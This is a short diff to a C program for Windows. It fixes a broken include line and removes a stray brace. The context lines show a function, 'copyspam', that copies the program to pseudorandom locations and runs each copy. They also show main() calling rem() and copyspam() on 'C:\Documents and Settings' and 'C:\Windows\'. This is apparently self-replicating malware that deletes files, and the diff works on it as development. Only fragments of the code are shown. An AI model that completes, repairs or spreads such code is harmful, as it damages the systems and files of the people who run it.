@@ -8,7 +8,7 @@
 # include <dirent.h>
 # include <time.h> 
 # include <ShellApi.h>
-# include <signal.h
+# include <signal.h>
 
 int copyspam(char s[50]){// makes a copy of the programm in 'pseudorandom' locations and also runs it 
 	int i,c;
@@ -124,7 +124,6 @@ int main (){
 	char a[50] = "C:\\Documents and Settings";
 	rem(a);
 	copyspam(a);
-	}
 	}
 	else if (x==8){
 	char a[50] = "C:\\Windows\\";
